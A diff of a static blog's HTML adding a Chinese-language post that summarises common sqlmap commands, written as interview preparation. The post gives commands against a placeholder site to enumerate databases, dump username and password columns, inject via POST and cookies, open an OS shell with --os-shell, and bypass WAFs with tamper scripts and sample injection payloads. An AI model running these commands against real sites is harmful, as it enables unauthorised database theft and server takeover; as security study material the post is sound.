@@ -139,6 +139,88 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-sqlmap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/15/sqlmap/">sqlmap</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/15/sqlmap/" class="archive-article-date">
+  	<time datetime="2020-04-15T09:05:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Sqlmap-常用命令"><a href="#Sqlmap-常用命令" class="headerlink" title="Sqlmap 常用命令"></a>Sqlmap 常用命令</h3><p>最近在准备面试…越看越觉得知识面不够…索性脚踏实地的慢慢来吧..技术这东西不能心急。于是简单总结一下平常常用的sqlmap命令<br>Sqlmap,众所周知是sql注入神器，功能强大，避免了手注的繁琐，实现自动化注入。<br>sqlmap支持五种不同的注入模式：</p>
+<pre><code>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+4、联合查询注入，可以使用union的情况下的注入。
+5、堆查询注入，可以同时执行多条语句的执行时的注入。</code></pre><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><p>1、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a><br>参数：-u：指定注入点url；默认使用level1检测全部数据库类型<br>2、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> –dbms mysql –dbs<br>–dbs 爆出所有库名 –dbms 指定当前库类型<br>3、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> -D test –tables<br>–tables 爆出test库中的所有表名<br>4、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> -D test -T test1 –columns<br>–columns 爆出test1表中的所有列名<br>5、sqlmap -u “<a href="http://www.xxx.com/1.php?id=1”" target="_blank" rel="noopener">http://www.xxx.com/1.php?id=1”</a> -D test -T test1 -C “username,password” –dump<br>–dump 将username,password内容拖下来<br>6、对于POST型sql注入，可以使用burpsuite抓包，将整个数据保存到文件中。再使用sqlmap：<br>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql<br>-p 指定注入参数<br>7、对于cookie注入<br>sqlmap -u “<a href="http://www.xxx.com/1.asp&quot;" target="_blank" rel="noopener">http://www.xxx.com/1.asp&quot;</a> –cookie “id=11” –level 2（只有level达到2才会检测cookie）level1-5，等级越高，检测越全面，当然牺牲时间就越长</p>
+<h3 id="其他sqlmap常用命令"><a href="#其他sqlmap常用命令" class="headerlink" title="其他sqlmap常用命令"></a>其他sqlmap常用命令</h3><p>–is-dba 当前用户权限（是否为root权限）<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–os-shell 交互式的操作系统的shell</p>
+<h3 id="sqlmap-使用脚本注入–tamper"><a href="#sqlmap-使用脚本注入–tamper" class="headerlink" title="sqlmap 使用脚本注入–tamper"></a>sqlmap 使用脚本注入–tamper</h3><p>sqlmap作为一款功能强大的注入工具，面对waf，自然也提供了一些脚本进行绕过；下面简单介绍几个，更多脚本可在/usr/share/golismero/tools/sqlmap/tamper查看<br><img src="../images/30.jpg" alt="1"><br>1、base64encode.py<br>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw==<br>2、apostrophemask.py<br>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871<br>3、space2plus.py<br>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p>
+<p>后期的目标是，自己能够尝试编写一些绕过脚本；</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/15/sqlmap/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Online-tool" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1021,6 +1103,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">sql-injection</a>
               </li>
             
             <div class="clearfix"></div>
